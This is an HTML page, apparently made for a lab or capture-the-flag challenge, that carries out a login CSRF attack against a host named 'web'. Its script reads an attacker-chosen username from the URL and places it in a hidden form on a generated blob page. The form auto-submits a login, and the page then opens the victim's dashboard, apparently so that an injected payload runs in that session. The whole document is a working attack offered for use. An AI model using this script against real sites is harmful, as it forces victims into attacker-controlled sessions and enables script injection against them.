<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <h1>Loading attack...</h1>
    <script>
        // Get malicious username from URL parameter
        const urlParams = new URLSearchParams(window.location.search);
        const maliciousUsername = urlParams.get('u');

        if (!maliciousUsername) {
            document.body.innerHTML = '<h1>Error: Missing username parameter</h1>';
        } else {
            // Create csrf.html content dynamically
            const csrfHtml = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
</head>
<body>
    <form id="loginForm" action="http://web/login" method="POST">
        <input type="hidden" name="username" value="${maliciousUsername}">
        <input type="hidden" name="password" value="password">
    </form>
    <script>
        window.onload = function() {
            document.getElementById('loginForm').submit();
        };
    <\/script>
</body>
</html>`;

            // Create a Blob URL for csrf.html
            const blob = new Blob([csrfHtml], { type: 'text/html' });
            const csrfUrl = URL.createObjectURL(blob);

            // Phase 1: Open CSRF page in new tab to auto-login
            window.open(csrfUrl);

            // Phase 2: After 1 second, open dashboard in new tab
            setTimeout(function() {
                window.open('http://web/dashboard');
            }, 1000);
        }
    </script>
</body>
</html>
